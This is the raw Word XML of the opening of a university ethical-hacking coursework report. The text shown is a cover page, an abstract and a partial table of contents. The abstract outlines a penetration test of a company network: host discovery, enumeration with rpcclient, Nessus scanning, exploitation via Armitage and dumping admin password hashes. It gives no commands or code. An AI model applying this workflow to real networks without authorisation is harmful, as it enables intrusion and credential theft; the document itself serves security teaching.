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CD34FA" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w14:paraId="4E761291" w14:textId="77777777" w:rsidR="00527338" w:rsidRDefault="00527338"/>
    <w:p w14:paraId="22B323E9" w14:textId="77777777" w:rsidR="00A50E2A" w:rsidRDefault="009C5438" w:rsidP="00527338">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="20EBAC6C" wp14:editId="0C427172">
            <wp:extent cx="3044825" cy="758825"/>
            <wp:effectExtent l="0" t="0" r="317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44825" cy="758825"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D757650" w14:textId="77777777" w:rsidR="009627B3" w:rsidRDefault="009627B3"/>
    <w:tbl>
      <w:tblPr>
        <w:tblpPr w:leftFromText="180" w:rightFromText="180" w:vertAnchor="page" w:horzAnchor="margin" w:tblpXSpec="center" w:tblpY="5236"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblBorders>
          <w:top w:val="single" w:sz="4" w:space="0" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="0" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="0" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="0" w:color="auto"/>
        </w:tblBorders>
        <w:tblLook w:val="01E0" w:firstRow="1" w:lastRow="1" w:firstColumn="1" w:lastColumn="1" w:noHBand="0" w:noVBand="0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7283"/>
      </w:tblGrid>
      <w:tr w:rsidR="0022030D" w14:paraId="5474F6E2" w14:textId="77777777" w:rsidTr="0022030D">
        <w:trPr>
          <w:cantSplit/>
          <w:trHeight w:val="4958"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="7283" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2E48BEA5" w14:textId="77777777" w:rsidR="009627B3" w:rsidRDefault="00763115" w:rsidP="0005417B">
            <w:pPr>
              <w:spacing w:after="0" w:line="260" w:lineRule="auto"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="56"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="56"/>
              </w:rPr>
              <w:t xml:space="preserve">Company Network Security </w:t>
            </w:r>
            <w:r w:rsidR="00ED2F72">
              <w:rPr>
                <w:b/>
                <w:sz w:val="56"/>
              </w:rPr>
              <w:t>Investigation</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="37C682C7" w14:textId="77777777" w:rsidR="009627B3" w:rsidRDefault="00ED2F72" w:rsidP="009627B3">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="222222"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="222222"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t xml:space="preserve">         A guide to Ethically Hacking </w:t>
            </w:r>
            <w:r w:rsidR="00D96F97">
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="222222"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>the</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="222222"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t xml:space="preserve"> network of a company </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5593E708" w14:textId="77777777" w:rsidR="0022030D" w:rsidRPr="009627B3" w:rsidRDefault="00763115" w:rsidP="009627B3">
            <w:pPr>
              <w:spacing w:after="161"/>
              <w:ind w:right="207"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="40"/>
              </w:rPr>
              <w:t>Peter Captain</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2612F679" w14:textId="77777777" w:rsidR="0022030D" w:rsidRPr="008750A3" w:rsidRDefault="00763115" w:rsidP="0022030D">
            <w:pPr>
              <w:spacing w:after="161"/>
              <w:ind w:right="207"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>CMP210 Ethical Hacking 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="40864E42" w14:textId="77777777" w:rsidR="0022030D" w:rsidRPr="008750A3" w:rsidRDefault="009627B3" w:rsidP="0022030D">
            <w:pPr>
              <w:spacing w:after="161"/>
              <w:ind w:right="207"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>BSc Ethical Hacking</w:t>
            </w:r>
            <w:r w:rsidR="0022030D" w:rsidRPr="008750A3">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t xml:space="preserve"> Year </w:t>
            </w:r>
            <w:r w:rsidR="00763115">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B750CB2" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D" w:rsidP="0022030D">
            <w:pPr>
              <w:spacing w:after="161"/>
              <w:ind w:right="207"/>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r w:rsidRPr="008750A3">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>201</w:t>
            </w:r>
            <w:r w:rsidR="00763115">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
            <w:r w:rsidRPr="008750A3">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:r w:rsidR="00763115">
              <w:rPr>
                <w:sz w:val="30"/>
              </w:rPr>
              <w:t>20</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="26301D6F" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="1EE6034B" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="79191129" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="51B44595" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="0BDE505B" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="6ABD63C2" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="7EA90C39" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="3646E57D" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="58DEACC6" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="719702E4" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w14:paraId="4956D24C" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w14:paraId="22CE95FD" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w14:paraId="6A5CBF5C" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w14:paraId="03260BF6" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w14:paraId="65A5802E" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897"/>
    <w:p w14:paraId="19335E2D" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="62B09952" w14:textId="77777777" w:rsidR="009627B3" w:rsidRDefault="009627B3"/>
    <w:p w14:paraId="2BF6C8BD" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="357FCE5B" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="031C4EC8" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="7006FA56" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="56BEB179" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D"/>
    <w:p w14:paraId="6CAB6604" w14:textId="77777777" w:rsidR="0022030D" w:rsidRDefault="0022030D" w:rsidP="0022030D">
      <w:pPr>
        <w:framePr w:hSpace="180" w:wrap="around" w:vAnchor="page" w:hAnchor="margin" w:xAlign="center" w:y="7553"/>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:i/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06759959" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="0022030D">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C015A8">
        <w:rPr>
          <w:i/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Note that Information contained in this document is for educational purposes.</w:t>
      </w:r>
      <w:r w:rsidR="00CA5897">
        <w:rPr>
          <w:i/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6888A267" w14:textId="77777777" w:rsidR="00CA5897" w:rsidRDefault="00CA5897" w:rsidP="0022030D">
      <w:pPr>
        <w:rPr>
          <w:i/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CCB36A9" w14:textId="77777777" w:rsidR="00FF69A5" w:rsidRPr="00CA5897" w:rsidRDefault="00974F37" w:rsidP="003363BE">
      <w:pPr>
        <w:pStyle w:val="Abtracttitle"/>
        <w:rPr>
          <w:sz w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00974F37">
        <w:t>Abstract</w:t>
      </w:r>
      <w:r w:rsidR="009627B3">
        <w:t xml:space="preserve"> or Executive Summary </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AFCEB26" w14:textId="77777777" w:rsidR="00763115" w:rsidRDefault="00763115" w:rsidP="00C545A5">
      <w:pPr>
        <w:ind w:left="567" w:right="201" w:hanging="567"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53D61760" w14:textId="77777777" w:rsidR="00763115" w:rsidRDefault="00763115" w:rsidP="00763115">
      <w:pPr>
        <w:ind w:left="567" w:right="201" w:hanging="567"/>
      </w:pPr>
      <w:r>
        <w:t>Networks are an integral part of any company in the 21</w:t>
      </w:r>
      <w:r w:rsidRPr="00763115">
        <w:rPr>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>st</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> century. An online presence is a great asset that enable a company to reach users and potential customers all around the globe. As such, these vital systems must be kept safe from hackers who seek to hinder and damage any company’s online presence by malicious methods. Unfortunately, not all systems have the best security and as a result, these systems can be easily breached and abused by a hacker.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="574BA068" w14:textId="77777777" w:rsidR="00763115" w:rsidRDefault="00763115" w:rsidP="00763115">
      <w:pPr>
        <w:ind w:left="567" w:right="201" w:hanging="567"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This report will explain and guide a user as to how to breach a system using penetration testing software suites and severely compromise a company’s online security. </w:t>
      </w:r>
      <w:r w:rsidR="00DB79C6">
        <w:t xml:space="preserve">Certain operating </w:t>
      </w:r>
      <w:r w:rsidR="00B93759">
        <w:t>systems</w:t>
      </w:r>
      <w:r w:rsidR="00DB79C6">
        <w:t xml:space="preserve"> such as Kali Linux and Windows include tools that allow the user to discover connections and services running on a network</w:t>
      </w:r>
      <w:r w:rsidR="00B93759">
        <w:t xml:space="preserve"> by using tools such as RPING and Angry IP Scanner, </w:t>
      </w:r>
      <w:r w:rsidR="00DB79C6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B93759">
        <w:t xml:space="preserve">then </w:t>
      </w:r>
      <w:r w:rsidR="00DB79C6">
        <w:t xml:space="preserve">using programs such as those that scan and enumerate like </w:t>
      </w:r>
      <w:r w:rsidR="004B786F">
        <w:t>Rpcclient</w:t>
      </w:r>
      <w:r w:rsidR="00B93759">
        <w:t xml:space="preserve"> can reveal more specific data such as the number of domains or even the names of the individuals using the network, allowing the hacker to decide how to approach the target. Even more scanning of the network can by services such as Nessus can analyze potential threats present in the network. Finally, by using programs through Kali such as </w:t>
      </w:r>
      <w:r w:rsidR="00DB79C6">
        <w:t>Armitage can be used to great effect here</w:t>
      </w:r>
      <w:r w:rsidR="00B93759">
        <w:t xml:space="preserve"> by </w:t>
      </w:r>
      <w:r w:rsidR="006D767D">
        <w:t>attempting</w:t>
      </w:r>
      <w:r w:rsidR="00B93759">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006D767D">
        <w:t>exploits that were discovered after scanning and enumerating vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B558A27" w14:textId="77777777" w:rsidR="006D767D" w:rsidRDefault="006D767D" w:rsidP="00763115">
      <w:pPr>
        <w:ind w:left="567" w:right="201" w:hanging="567"/>
      </w:pPr>
      <w:r>
        <w:t>Once these vulnerabilities have been exploited, this report aims to show how damaging that can be to a company. Whilst certain things such as taking a screenshot of the remote client PC might not be the most serious threat,</w:t>
      </w:r>
      <w:r w:rsidR="004956A5">
        <w:t xml:space="preserve"> however,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> accessing the admin account </w:t>
      </w:r>
      <w:r w:rsidR="004956A5">
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> collecting a dump of all the hashed passwords is perhaps one of the most serious threats a company can face, as every part of the system can be breached through the administrator account</w:t>
      </w:r>
      <w:r w:rsidR="004B786F">
        <w:t>, and once someone has control of the admin account, it can be notoriously difficult to remove them.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BA1C1DF" w14:textId="77777777" w:rsidR="006D767D" w:rsidRDefault="006D767D" w:rsidP="00763115">
      <w:pPr>
        <w:ind w:left="567" w:right="201" w:hanging="567"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="379781B2" w14:textId="77777777" w:rsidR="004C6BF5" w:rsidRDefault="004C6BF5" w:rsidP="00C545A5">
      <w:pPr>
        <w:ind w:left="567" w:hanging="567"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A5762E7" w14:textId="77777777" w:rsidR="00977C19" w:rsidRDefault="00977C19"/>
    <w:p w14:paraId="157A1E93" w14:textId="77777777" w:rsidR="00977C19" w:rsidRDefault="00977C19"/>
    <w:p w14:paraId="08F39B0A" w14:textId="77777777" w:rsidR="004C6BF5" w:rsidRDefault="004C6BF5"/>
    <w:p w14:paraId="048F7380" w14:textId="77777777" w:rsidR="00AD59AD" w:rsidRDefault="00AD59AD"/>
    <w:p w14:paraId="0E4EB711" w14:textId="77777777" w:rsidR="00AD59AD" w:rsidRDefault="00AD59AD"/>
    <w:p w14:paraId="7CD1B82D" w14:textId="77777777" w:rsidR="00833EA1" w:rsidRDefault="00833EA1"/>
    <w:p w14:paraId="14938E9C" w14:textId="77777777" w:rsidR="00833EA1" w:rsidRDefault="00833EA1"/>
    <w:p w14:paraId="7BD2BEAD" w14:textId="77777777" w:rsidR="00974F37" w:rsidRDefault="00974F37"/>
    <w:p w14:paraId="5EE9E20A" w14:textId="77777777" w:rsidR="00FF69A5" w:rsidRDefault="00FF69A5" w:rsidP="00974F37"/>
    <w:p w14:paraId="4D9188C0" w14:textId="77777777" w:rsidR="008A58E3" w:rsidRDefault="00527338" w:rsidP="00712DC9">
      <w:pPr>
        <w:pStyle w:val="Title"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:id w:val="-265923424"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Table of Contents"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:bCs/>
          <w:noProof/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="633815E6" w14:textId="77777777" w:rsidR="00712DC9" w:rsidRPr="00712DC9" w:rsidRDefault="00BA7AE1" w:rsidP="003363BE">
          <w:pPr>
            <w:pStyle w:val="Abtracttitle"/>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:b w:val="0"/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
            </w:rPr>
            <w:t>+</w:t>
          </w:r>
          <w:r w:rsidR="00712DC9" w:rsidRPr="00974F37">
            <w:t>Contents</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="79AD04D3" w14:textId="4FB69342" w:rsidR="004B786F" w:rsidRDefault="00404615">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="00712DC9">
            <w:instrText xml:space="preserve"> TOC \o "1-3" \h \z \u </w:instrText>
          </w:r>
          <w:r>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:hyperlink w:anchor="_Toc27518391" w:history="1">
            <w:r w:rsidR="004B786F" w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="004B786F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004B786F" w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Introduction</w:t>
            </w:r>
            <w:r w:rsidR="004B786F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004B786F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004B786F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc27518391 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004B786F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004B786F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00EB3746">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r w:rsidR="004B786F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7D9EFE8C" w14:textId="5F7A9D82" w:rsidR="004B786F" w:rsidRDefault="004B786F">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="880"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc27518392" w:history="1">
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.1</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Background</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc27518392 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00EB3746">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="57983047" w14:textId="679C8A2B" w:rsidR="004B786F" w:rsidRDefault="004B786F">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="880"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc27518393" w:history="1">
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.2</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Aim</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc27518393 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00EB3746">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0480F188" w14:textId="3080145E" w:rsidR="004B786F" w:rsidRDefault="004B786F">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc27518394" w:history="1">
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Procedure</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc27518394 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00EB3746">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>7</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="61BEAACC" w14:textId="0108D6C3" w:rsidR="004B786F" w:rsidRDefault="004B786F">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="880"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc27518395" w:history="1">
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.1</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="00F44B83">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Overview of Procedure</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
